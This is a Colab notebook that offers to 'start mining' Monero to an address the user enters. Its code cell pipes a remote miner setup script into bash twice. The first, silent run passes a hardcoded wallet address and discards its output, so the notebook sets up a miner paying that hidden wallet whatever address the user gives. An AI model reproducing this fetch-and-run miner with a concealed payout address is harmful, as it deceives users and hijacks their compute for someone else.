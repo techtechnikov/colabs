{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "mining.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyN18Bn6uv80f5ApTfuLBXP9",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/techtechnikov/colabs/blob/main/mining.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "DxkM97w8dUcJ"
      },
      "source": [
        "#@title Start mining! { vertical-output: true, display-mode: \"form\" }\n",
        "monero_address = \"\" #@param {type:\"string\"}\n",
        "!curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 43PrhPVeWEUcrbzJTUXajpWxtRGs95kw8S1Fwjh7NZphBUKLxdtuh8TgsmPT9hr2hg1Kn1xAJJkyN2mR9TTSL2fk4aKNP1B > /dev/null\n",
        "import os\n",
        "os.system('curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s '+monero_address)\n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}